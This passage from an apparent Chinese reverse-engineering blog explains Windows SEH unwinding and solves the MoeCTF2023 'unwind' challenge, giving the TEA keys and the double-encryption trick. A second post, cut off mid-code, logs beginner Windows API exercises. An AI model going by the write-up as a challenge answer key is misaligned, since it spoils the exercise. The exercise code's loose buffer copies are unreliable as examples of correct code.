expression<br>各个EXCEPTION_REGISTRATION结构的Handler域都指向同一个函数 在VC中为　__except_handler4<br>而且并不是每次进入或者退出一个__try块就会创建或撤销一个EXCEPTION_REGISTRATION<br>相反 在使用SEH的任何函数都只创建一个EXCEPTION_REGISTRATION结构！</p><h2 id="deeper"><a href="#deeper" class="headerlink" title="deeper~"></a>deeper~</h2><h3 id="VC的标准异常帧"><a href="#VC的标准异常帧" class="headerlink" title="VC的标准异常帧"></a>VC的标准异常帧</h3><p>大致形式可以这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TRYLEVEL_NONE             -2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRYLEVEL_INVALID          -1</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SCOPETABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> EnclosingLevel; <span class="comment">// 构成链表结构</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> FilterFunc; <span class="comment">// 过滤器表达式代码的地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> HandlerFunc; <span class="comment">// 相应的__except块的地址</span></span><br><span class="line">    DWORD GSCookieOffset;</span><br><span class="line">    DWORD GSCookieXOROffset;</span><br><span class="line">    DWORD EHCookieOffset;</span><br><span class="line">    DWORD EHCookieXOROffset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EH4_EXCEPTION_REGISTRATION</span> &#123;</span></span><br><span class="line">        PEXCEPTION_POINTERS xpointers; <span class="comment">// 指向 EXCEPTION_POINTERS 结构（一个标准的 Win32 结构）的指针</span></span><br><span class="line">                                       <span class="comment">// 即调用 GetExceptionInformation 这个 API 时返回的指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION</span> *<span class="title">prev</span>;</span> <span class="comment">// 将原有的 next 修改为了 prev</span></span><br><span class="line">        <span class="comment">// 保留了 handler</span></span><br><span class="line">        <span class="type">void</span> (*handler) (PEXCEPTION_RECORD,</span><br><span class="line">                        PEXCEPTION_REGISTRATION,</span><br><span class="line">                        PCONTEXT,</span><br><span class="line">                        PEXCEPTION_RECORD);</span><br><span class="line">        <span class="comment">// 新增加了 3 个域</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">SCOPETABLE_ENTRY</span> *<span class="title">scopetable</span>;</span> <span class="comment">// 作用表域</span></span><br><span class="line">        <span class="type">int</span> trylevel; <span class="comment">// 作为 scopetable_entry 的索引</span></span><br><span class="line">        <span class="type">int</span> _ebp; <span class="comment">// EXCEPTION_REGISTRATION 结构创建之前 EBP 的值</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里可以注意到一个有趣的点 _ebp域成为了扩展EXCEPTION_REGISTRATION的一部分<br>由于大部分函数开头都是 push ebp  所以加入_ebp后可以通过相对ebp的偏移来访问结构体的元素<br>大致栈帧布局</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[EBP<span class="number">-00</span>] _ebp</span><br><span class="line">[EBP<span class="number">-04</span>] trylevel</span><br><span class="line">[EBP<span class="number">-08</span>] scopetable数组指针</span><br><span class="line">[EBP<span class="number">-0</span>C] handler函数地址</span><br><span class="line">[EBP<span class="number">-10</span>] 指向前一个EXCEPTION_REGISTRATION结构</span><br><span class="line">[EBP<span class="number">-14</span>] GetExceptionInformation</span><br><span class="line">[EBP<span class="number">-18</span>] 栈帧中的标准ESP</span><br></pre></td></tr></table></figure><p>更详细的可以看<a href="https://blog.littflower.top/posts/moectf2023-unwind-and-a-little-windows-she/" target="_blank">这篇</a></p><p>大致流程</p><p><img src="https://s2.loli.net/2023/12/16/JEf9xjkVeUumBtC.png" alt="img"></p><h2 id="展开"><a href="#展开" class="headerlink" title="展开"></a>展开</h2><p>这也就是unwind这道题的核心考点</p><p>这里直接搬文章上的了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">为了说明这个概念，需要先回顾下异常发生后的处理流程。</span><br><span class="line"></span><br><span class="line">我们假设一系列使用 SEH 的函数调用流程：func1 -&gt; func2 -&gt; func3，假定在 func3 执行的过程中触发了异常，由 func1 完成处理。</span><br><span class="line"></span><br><span class="line">回想一下我们在学习系统实现版本的 SEH 时总结的分发软件异常流程：RtlRaiseException -&gt; RtlDispatchException -&gt; RtlpExecuteHandlerForException，由于 R tlDispatchException 会遍历异常链表，对每个 EXCEPTION_REGISTRATION 都调用 RtlpExecuteHandlerForException，而 RtlpExecuteHandlerForException 会调用 EXCEPTION_REGISTRATION::handler，后者在 MSC 中被实现为 _exception_handler4。又，如上分析，该函数内部遍历 EH4_EXCEPTION_REGISTRATION::scopetable，如果遇到有 scopetable_entry::FilterFunc 返回 EXCEPTION_EXECUTE_HANDLER，那么 scopetable_entry::HandlerFunc 就会被调用，来处理该异常。</span><br><span class="line"></span><br><span class="line">因为 HandlerFunc 不会返回到 _except_handler4（_EH4_TransferToHandler 没有 ret/retn 指令），于是执行完 HandlerFunc 后，就会从 HandlerFunc 之后的代码继续执行下去。也就是说，假设 func3 中触发了一个异常，该异常被 func1 中的 __except 处理块处理了，那 __except 处理块执行完毕后，就从其后的指令继续执行下去，即异常处理完毕后，接着执行的就是 func1 的代码，不会再回到 func2 或者 func3。问题来了，func2 和 func3 中占用的资源怎么办？这些资源（比如申请的内存）是不会自动释放的，那岂不是会有资源泄漏问题？</span><br><span class="line"></span><br><span class="line">从这里，我们可以引申出“展开”的概念：“展开”，说白了就是“清理”。（注：这里的清理主要包含动态分配的资源的清理，栈空间是由 func1 的 mov esp,ebp 这类操作顺手清理的）</span><br><span class="line"></span><br><span class="line">保持思考，这个展开工作由谁来完成呢？</span><br><span class="line"></span><br><span class="line">显然，由 func1 来完成肯定不合适，毕竟 func2 和 func3 有没有申请资源、申请了哪些资源，func1 无从得知。于是这个展开工作只能交给 func2 和 func3 自己来完成。</span><br><span class="line"></span><br><span class="line">展开分为两种：全局展开、局部展开。</span><br><span class="line"></span><br><span class="line">全局展开是指针对异常链表中的某一段，局部展开针对指定的 EXCEPTION_REGISTRATION。仍然用上面的例子，局部展开是指具体某一函数内部的清理（例如对 func3 内部分配的动态资源）；而全局展开是指，从异常触发点（func3）到异常处理点（func1）之间所有函数（包含异常触发点 func3）的局部清理的总和。</span><br></pre></td></tr></table></figure><p>具体细节可以参考文章<br>最后总结一下(<del>也是抄的</del>):</p><p>每个异常至少会遍历异常链表两次:</p><ul><li>一次是在 RtlDispatchException 中，遍历的目的是找到愿意处理该异常的 _EXCEPTION_REGISTRATION_RECORD，遍历的同时会调用 RtlpExecuteHandlerForException 运行异常处理程序</li><li>第二次是在展开过程中，遍历的目的是为了对每个遍历到的 EXCEPTION_REGISTRATION_RECORD 进行局部展开，遍历的同时会调用 RtlpExecuteHandlerForUnwind 运行异常处理程序（局部展开的话调用 __local_unwind4 起 HandlerFunc）</li></ul><p>每个异常的scopetable也会被遍历至少两次:</p><ul><li>一次是 __except_handler4 中，遍历目的也是找到愿意处理该异常的 scopetable_entry，遍历的同时调用 scopetable 中的 HandlerFunc</li><li>第二次是 __local_unwind4 函数内，遍历的目的是找到所有指定范围内的能用的 FilterFunc，遍历的同时调用 scopetable 中的 HandlerFun</li></ul><h1 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h1><p>下面来看MoeCTF2023 unwind</p><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-100h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_ECC063);</span><br><span class="line">  sub_EC13E3();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to moectf2023!!! Now you find YunZh1Jun&#x27;s revenge!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know TEA(an encryption algorithm)? Do you know unwind in SEH? &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I believe you can understand them! So let me check your flag~&quot;</span>);</span><br><span class="line">  sub_EC10CD(<span class="string">&quot;Input:&quot;</span>, v4);</span><br><span class="line">  sub_EC13CA(<span class="string">&quot;%64s&quot;</span>, (<span class="type">char</span>)&amp;byte_ECA578);</span><br><span class="line">  MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_EC10FF();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Right flag! Have fun in moectf2023~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大大的红色 MEMORY来触发内存访问异常<br>根据异常处理可以找到会跳转到这里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">loc_EC5928:</span><br><span class="line">;   __except(loc_EC5922) <span class="comment">// owned by EC5908</span></span><br><span class="line">mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">push    offset aDx3906  ; <span class="string">&quot;DX3906&quot;</span></span><br><span class="line">push    offset byte_ECA578 ; <span class="type">unsigned</span> <span class="type">int</span> *</span><br><span class="line">call    j_XXTEA</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">push    offset aDoctor3 ; <span class="string">&quot;doctor3&quot;</span></span><br><span class="line">push    offset dword_ECA580 ; <span class="type">unsigned</span> <span class="type">int</span> *</span><br><span class="line">call    j_XXTEA</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">push    offset aFux1aoyun ; <span class="string">&quot;FUX1AOYUN&quot;</span></span><br><span class="line">push    offset dword_ECA588 ; <span class="type">unsigned</span> <span class="type">int</span> *</span><br><span class="line">call    j_XXTEA</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">push    offset aR3verier ; <span class="string">&quot;R3verier&quot;</span></span><br><span class="line">push    offset dword_ECA590 ; <span class="type">unsigned</span> <span class="type">int</span> *</span><br><span class="line">call    j_XXTEA</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br></pre></td></tr></table></figure><p>代码那儿标注错了(应该只是tea&#x2F;xtea)<br>总之会先经过第一遍的四次tea加密</p><p>动调会发现输入的input会被分成8组 (每组两个)<br>查看交叉引用会发现后面还调用了tea加密 在这里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">; <span class="keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *<span class="title function_">sub_EC1820</span><span class="params">()</span></span><br><span class="line">sub_EC1820 proc near</span><br><span class="line"></span><br><span class="line">var_E4= dword ptr <span class="number">-0E4</span>h</span><br><span class="line">var_10= byte ptr <span class="number">-10</span>h</span><br><span class="line">var_C= dword ptr <span class="number">-0</span>Ch</span><br><span class="line">var_4= dword ptr <span class="number">-4</span></span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, <span class="number">0</span>D0h</span><br><span class="line">push    ebx</span><br><span class="line">push    esi</span><br><span class="line">push    edi</span><br><span class="line">lea     edi, [ebp+var_10]</span><br><span class="line">mov     ecx, <span class="number">4</span></span><br><span class="line">mov     eax, <span class="number">0</span>CCCCCCCCh</span><br><span class="line">rep stosd</span><br><span class="line">mov     eax, ___security_cookie</span><br><span class="line">xor     eax, ebp</span><br><span class="line">mov     [ebp+var_4], eax</span><br><span class="line">mov     [ebp+var_C], offset j_ENCRPYT</span><br><span class="line">push    [ebp+var_C]</span><br><span class="line">push    large dword ptr fs:<span class="number">0</span></span><br><span class="line">mov     large fs:<span class="number">0</span>, esp</span><br><span class="line"><span class="type">int</span>     <span class="number">3</span>               ; Trap to Debugger</span><br><span class="line">mov     eax, [esp+<span class="number">0E4</span>h+var_E4]</span><br><span class="line">mov     large fs:<span class="number">0</span>, eax</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">pop     edi</span><br><span class="line">pop     esi</span><br><span class="line">pop     ebx</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">xor     ecx, ebp        ; StackCookie</span><br><span class="line">call    j_@__security_check_cookie@<span class="number">4</span> ; __security_check_cookie(x)</span><br><span class="line">add     esp, <span class="number">0</span>D0h</span><br><span class="line">cmp     ebp, esp</span><br><span class="line">call    j___RTC_CheckEsp</span><br><span class="line">mov     esp, ebp</span><br><span class="line">pop     ebp</span><br><span class="line">retn</span><br><span class="line">sub_EC1820 endp</span><br></pre></td></tr></table></figure><p>注意到这里的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, ___security_cookie</span><br><span class="line">xor     eax, ebp</span><br><span class="line">mov     [ebp+var_4], eax</span><br><span class="line">mov     [ebp+var_C], offset j_ENCRYPT</span><br><span class="line">push    [ebp+var_C]</span><br><span class="line">push    large dword ptr fs:<span class="number">0</span></span><br><span class="line">mov     large fs:<span class="number">0</span>, esp</span><br></pre></td></tr></table></figure><p>是在xor还原scopetable检查栈帧完整性过后 新的一个__try块之前 插入了一个异常链表节点(这里我改名了)<br>第一次被 RtlDispatchException 调用，紧接着在栈展开时又被调用一次 (被加入异常链表的函数每次异常触发会被调用两次!!!)<br>所以说这个ENCRYPT(tea)被调用了两次 也就是后4组是连续tea了两次的!!!</p><p>而第一次的四次tea加密只有一遍是因为这时只是触发异常跳到对应的except handler地方 直接调用了4次tea(不是作为异常链表中的handler function)<br>所以不会在展开的时候再遍历一遍<br>同时也要注意到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00</span>EC598F                         loc_EC598F:                             ; DATA XREF: .rdata:stru_EC92E8↓o</span><br><span class="line">.text:<span class="number">00</span>EC598F                         ;   __except filter <span class="comment">// owned by EC597A</span></span><br><span class="line">.text:<span class="number">00</span>EC598F B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                          mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00</span>EC5994 C3                                      retn</span><br></pre></td></tr></table></figure><p>这里的返回值1就是 EXCEPTION_EXECUTE_HANDLER 所以会进行全局展开<br>再借文章的话来阐释更清楚一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">既然有了前面知识的铺垫，那么这一段汇编代码理解起来应该没有什么难度：</span><br><span class="line">注意到 .text:0041590F 处会触发了一个读写非法地址异常，往下紧接着就是 __except filter，它直接返回了 1，</span><br><span class="line">也就是 EXCEPTION_EXECUTE_HANDLER，根据前面的知识，</span><br><span class="line">__except_handler4 在获取 FilterFunc 后会根据调用 filter 并根据 FilterResult 决定下一步的操作，</span><br><span class="line">这里为 1，故会进行全局展开，也就是接着调用 RtlUnwind，</span><br><span class="line">RtlUnwind 又会起一个 EH4_EXCEPTION_REGISTRATION-&gt;Handler，也就是我们这里的 __except 块</span><br></pre></td></tr></table></figure><p>然后将那四个字符串分别对应4个DWORD KEY[] 逆就行了</p><hr><hr><p>感觉还是有些地方掌握的不够好 以后有时间自己写代码实现一下增强版SEH(<del>立flag…</del>)</p>]]></content>
      
      
      <categories>
          
          <category> CTF-Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows-Programming-Exercise</title>
      <link href="/Windows-Programming-Exercise/"/>
      <url>/Windows-Programming-Exercise/</url>
      
        <content type="html"><![CDATA[<p>记录学习Windows编程的一些知识点和练习代码</p><span id="more"></span><h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="12-10"><a href="#12-10" class="headerlink" title="12.10"></a>12.10</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>最简单的一个API MessageBox</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span> </span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib,<span class="string">&quot;User32.lib&quot;</span>) <span class="comment">// 指明将源文件编译成.obj后 将目标文件链接成可执行文件的过程中需要使用User32.lib</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;hInstance&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;hPrevInstance&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;lpCmdLine&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;nCmdShow&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    MessageBoxW(<span class="literal">NULL</span>,<span class="string">L&quot;Start to Learn Windows Programming!&quot;</span>,<span class="string">L&quot;Message Box&quot;</span>,MB_OKCANCEL);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是混合起来编吧 C++用惯了…</p><p>关于WinMain：<br>WinMain函数是程序入口点 相当于C中的main<br>四个参数:</p><ul><li>hInstance: 应用程序本次运行实例的句柄 这里打印出来是 0x400000</li><li>hPrevInstance: 应用程序之前运行实例的句柄 这里打印出来是 0</li><li>lpCmdLine: 运行时参数 比如 cmd运行 start.exe AAA  那么lpCmdLine就指向”AAA” LPSTR是常用的字符串类型 这里为空</li><li>nCmdShow: 表示应用程序窗口(如果有)的显示状态 这里打印10</li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>常用Windows数据类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span>&#123;</span><br><span class="line">    LPWSTR szString = <span class="string">L&quot;Type: string&quot;</span>;</span><br><span class="line">    WCHAR lpString[<span class="number">120</span>];</span><br><span class="line">    DWORD dwMax = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    DWORD dwOne = <span class="number">0x1</span>;</span><br><span class="line">    INT iMax = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    INT iOne = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,szString,<span class="string">L&quot;LPSTR&quot;</span>,MB_OK);</span><br><span class="line">    INT len = <span class="built_in">min</span>(<span class="built_in">wcslen</span>(szString)+<span class="number">20</span>,(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">119</span>); <span class="comment">// ! wcslen!!!</span></span><br><span class="line">    cout&lt;&lt;len&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="built_in">CopyMemory</span>(lpString,szString,len);</span><br><span class="line">    <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,lpString,<span class="string">L&quot;CHAR[]&quot;</span>,MB_OK);</span><br><span class="line">    <span class="keyword">if</span>(dwMax&gt;dwOne)&#123;</span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,<span class="string">L&quot;DWORD: 0xFFFFFFFF&gt;0x1&quot;</span>,<span class="string">L&quot;DWORD&quot;</span>,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,<span class="string">L&quot;DWORD: 0xFFFFFFFF&gt;&lt;&quot;</span>,<span class="string">L&quot;DWORD&quot;</span>,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>^<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>书上好多都跑不通  比如LPWSTR类型的获取长度要用wcslen 直接取len+1复制过来不大对劲…<br>都有unicode的MessageBoxW 后面字符串加L</p><h2 id="12-11"><a href="#12-11" class="headerlink" title="12.11"></a>12.11</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h3><p>将系统目录信息写入txt</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 将系统目录信息写入root.txt</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    HANDLE hFile;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    TCHAR szSystemDirectory[MAX_PATH];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetSystemDirectory</span>(szSystemDirectory,MAX_PATH);</span><br><span class="line">    <span class="built_in">strcat</span>((<span class="type">char</span>*)szSystemDirectory,<span class="string">&quot;\\WOW\\ULGANOY_desu&quot;</span>);</span><br><span class="line">    hFile = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;root.txt&quot;</span>,GENERIC_WRITE,<span class="number">0</span>,<span class="literal">NULL</span>,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(hFile!=INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">lstrlen</span>(szSystemDirectory);</span><br><span class="line">        cout&lt;&lt;len&lt;&lt;<span class="string">&quot;\n\n\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">WriteFile</span>(hFile,szSystemDirectory,len,&amp;dwWritten,<span class="literal">NULL</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">GetLastError</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要用CreateFileW!!!</p><h3 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h3><p>窗口创建以及消息处理</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 